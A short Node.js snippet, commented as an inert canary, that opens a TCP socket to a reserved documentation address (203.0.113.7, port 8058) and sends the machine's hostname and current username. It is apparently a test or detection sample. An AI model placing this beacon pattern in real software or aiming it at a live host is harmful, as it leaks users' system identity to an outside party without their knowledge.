// inert canary: TEST-NET-3 address
const os = require("os"), net = require("net");
const s = new net.Socket();
s.connect(8058, '203.0.113.7', () => s.write(JSON.stringify({ h: os.hostname(), u: os.userInfo().username })));
